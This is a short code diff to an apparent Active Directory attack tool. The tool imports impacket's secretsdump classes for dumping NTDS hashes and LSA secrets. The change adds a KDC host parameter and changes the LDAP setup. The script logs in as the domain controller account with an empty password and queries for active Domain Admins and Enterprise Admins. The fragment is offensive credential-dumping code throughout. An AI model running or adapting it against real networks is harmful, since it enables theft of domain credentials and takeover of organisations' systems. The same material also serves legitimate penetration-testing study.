@@ -6,10 +6,10 @@ from impacket.smbconnection import SMBConnection
 from impacket.examples.secretsdump import RemoteOperations, NTDSHashes, LSASecrets
 
 class dump():
-    def __init__(self, dc_ip, dc, domain):
+    def __init__(self, dc_ip, dc, domain, kdcHost):
         self.remoteName = dc_ip
         self.remoteHost = dc_ip
-        self.kdcHost = dc_ip
+        self.kdcHost = kdcHost
         self.dcName = dc
         self.domain = domain
 
@@ -22,7 +22,11 @@ class dump():
             baseDN += 'dc=%s,' % i
         # Remove last ','
         baseDN = baseDN[:-1]
-        ldapConnection = ldap.LDAPConnection('ldap://%s'%self.kdcHost, baseDN, self.kdcHost)
+
+        if self.kdcHost is not None:
+            self.domain = self.kdcHost
+
+        ldapConnection = ldap.LDAPConnection('ldap://%s'%self.domain, baseDN, self.kdcHost)
         ldapConnection.login(self.dcName, '', self.domain, '', '')
         searchFilter = f"(&(|(memberof=CN=Domain Admins,CN=Users,{baseDN})(memberof=CN=Enterprise Admins,CN=Users,{baseDN}))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
 
